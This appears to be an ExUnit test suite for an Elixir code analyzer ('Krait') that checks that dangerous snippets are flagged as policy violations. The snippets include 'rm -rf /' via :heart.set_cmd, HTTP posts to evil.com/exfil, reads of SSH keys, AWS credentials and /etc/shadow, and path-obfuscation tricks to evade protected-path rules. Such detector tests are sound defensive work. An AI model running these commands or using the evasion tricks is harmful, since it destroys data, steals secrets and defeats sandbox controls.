defmodule Krait.Analyzer.QuickAstV13Test do
  use ExUnit.Case, async: true

  alias Krait.Analyzer.Quick

  # ---------------------------------------------------------------------------
  # Phase 2: C1-C5 — Dangerous Erlang module expansion
  # ---------------------------------------------------------------------------

  describe "v13-P2: KRAIT-001 dangerous Erlang modules" do
    test ":timer.apply_after -> KRAIT-001" do
      code = ~S':timer.apply_after(1000, :os, :cmd, [~c"whoami"])'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":shell.eval_exprs -> KRAIT-001" do
      code = ~S':shell.eval_exprs(exprs, bindings)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":cover.compile_directory -> KRAIT-001" do
      code = ~S':cover.compile_directory("/tmp/evil")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erl_scan.string -> KRAIT-001" do
      code = ~S':erl_scan.string(~c"os:cmd(\"whoami\").")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erl_parse.parse_exprs -> KRAIT-001" do
      code = ~S':erl_parse.parse_exprs(tokens)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":zip.extract -> KRAIT-001" do
      code = ~S':zip.extract(~c"evil.zip", [{:cwd, ~c"/tmp"}])'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "v13-P2: KRAIT-002 dangerous Erlang modules" do
    test ":heart.set_cmd -> KRAIT-002" do
      code = ~S':heart.set_cmd(~c"rm -rf /")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":ct.run -> KRAIT-002" do
      code = ~S':ct.run([{:suite, EvilTest}])'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":ct_slave.start -> KRAIT-002" do
      code = ~S':ct_slave.start(:evil_node)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":sys.get_state -> KRAIT-002" do
      code = ~S':sys.get_state(pid)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":dbg.tracer -> KRAIT-002" do
      code = ~S':dbg.tracer()'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "v13-P2: KRAIT-004 dangerous Erlang modules" do
    test ":net_adm.ping -> KRAIT-004" do
      code = ~S':net_adm.ping(:evil@host)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":net.if_names -> KRAIT-004" do
      code = ~S':net.if_names()'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":inet_res.resolve -> KRAIT-004" do
      code = ~S':inet_res.resolve(~c"evil.com", :in, :a)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":eldap.open -> KRAIT-004" do
      code = ~S':eldap.open([~c"ldap.evil.com"])'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "v13-P2: KRAIT-005 dangerous Erlang modules" do
    test ":erl_ddll.load_driver -> KRAIT-005" do
      code = ~S':erl_ddll.load_driver("/tmp", "evil_driver")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erl_prim_loader.get_file -> KRAIT-005" do
      code = ~S':erl_prim_loader.get_file("evil.beam")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erl_boot_server.start -> KRAIT-005" do
      code = ~S':erl_boot_server.start([{192, 168, 1, 0}])'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":global.register_name -> KRAIT-005" do
      code = ~S':global.register_name(:evil_proc, self())'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":pool.attach -> KRAIT-005" do
      code = ~S':pool.attach(:evil_pool)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 3: H5 — Tesla + Mojito HTTP client detection
  # ---------------------------------------------------------------------------

  describe "v13-P3: Tesla/Mojito HTTP client detection" do
    test "Tesla.get(url) -> KRAIT-004" do
      code = ~S'Tesla.get("https://evil.com/exfil")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Tesla.post(url, body) -> KRAIT-004" do
      code = ~S'Tesla.post("https://evil.com/exfil", body)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Mojito.get(url) -> KRAIT-004" do
      code = ~S'Mojito.get("https://evil.com/exfil")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "import Tesla -> KRAIT-004" do
      code = ~S'import Tesla'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 4: H1+M1 — _build/ path + case-insensitive match
  # ---------------------------------------------------------------------------

  describe "v13-P4: _build/ path and case-insensitive match" do
    test "_build/ in string literal -> KRAIT-ALW (File not allowlisted)" do
      code = ~S'File.write!("_build/prod/lib/krait/ebin/mod.beam", payload)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.write! to _build/prod path -> KRAIT-ALW (File not allowlisted)" do
      code = ~S'File.write!("_build/dev/lib/krait/ebin/Elixir.Krait.beam", evil)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "NATIVE/KRAIT_ANALYZER uppercase -> KRAIT-ALW (File not allowlisted)" do
      code = ~S'File.write!("NATIVE/KRAIT_ANALYZER/src/evil.rs", payload)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Native/Krait_Analyzer mixed case -> KRAIT-ALW (File not allowlisted)" do
      code = ~S'File.write!("Native/Krait_Analyzer/src/evil.rs", payload)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 5: H2 — Charlist credential/immutable path detection
  # ---------------------------------------------------------------------------

  describe "v13-P5: charlist literal detection" do
    test "File.read!('~/.ssh/id_rsa') charlist -> KRAIT-003" do
      code = ~S"File.read!('~/.ssh/id_rsa')"
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.write!('~/.aws/credentials', data) charlist -> KRAIT-003" do
      code = ~S"File.write!('~/.aws/credentials', data)"
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "'native/krait_analyzer' charlist -> KRAIT-006" do
      code = ~S"path = 'native/krait_analyzer'"
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read!('/tmp/safe.txt') charlist -> KRAIT-ALW (File not allowlisted)" do
      code = ~S"File.read!('/tmp/safe.txt')"
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 8: H4 — Metaprogramming escape hatches
  # ---------------------------------------------------------------------------

  describe "v13-P8: metaprogramming escape hatches" do
    test "@external_resource with credential path -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        @external_resource "/etc/shadow"
        def steal, do: File.read!(@external_resource)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "@external_resource with immutable path -> KRAIT-ALW (File not allowlisted)" do
      code = ~S'''
      defmodule Evil do
        @external_resource "native/krait_analyzer/src/rules.rs"
        def attack, do: File.read!(@external_resource)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "__ENV__.file passes clean (compile-time macro, no module call)" do
      code = ~S'''
      defmodule Evil do
        def leak, do: __ENV__.file
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "__DIR__ passes clean (compile-time macro, no module call)" do
      code = ~S'''
      defmodule Evil do
        def leak, do: __DIR__
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "@external_resource '/tmp/safe.txt' -> KRAIT-ALW (File not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        @external_resource "/tmp/safe.txt"
        def read, do: File.read!(@external_resource)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 9: H6 — KRAIT-006 advanced path evasion
  # ---------------------------------------------------------------------------

  describe "v13-P9: advanced path evasion" do
    test "Atom.to_string(:krait_analyzer) path construction -> KRAIT-ALW (Atom not allowlisted)" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = Atom.to_string(:native) <> "/" <> Atom.to_string(:krait_analyzer)
          File.write!(path, "hacked")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "String.reverse of immutable path -> KRAIT-ALW (File not allowlisted)" do
      code = ~S'''
      defmodule Evil do
        def attack do
          path = String.reverse("rezylana_tiark/evitan")
          File.write!(path, "hacked")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Enum.flat_map + Enum.join evasion -> KRAIT-ALW (Atom/File not allowlisted)" do
      code = ~S'''
      defmodule Evil do
        def attack do
          parts = Enum.flat_map([:krait_analyzer], fn a -> [Atom.to_string(a)] end)
          path = Enum.join(parts, "/")
          File.write!(path, "hacked")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "String.slice + binary concat -> KRAIT-006" do
      code = ~S'''
      defmodule Evil do
        def attack do
          part = String.slice("krait_analyzer_extra", 0, 14)
          path = "native/" <> part
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test "Atom.to_string(:safe) -> KRAIT-ALW (Atom not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def run do
          name = Atom.to_string(:hello)
          IO.puts(name)
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end
end
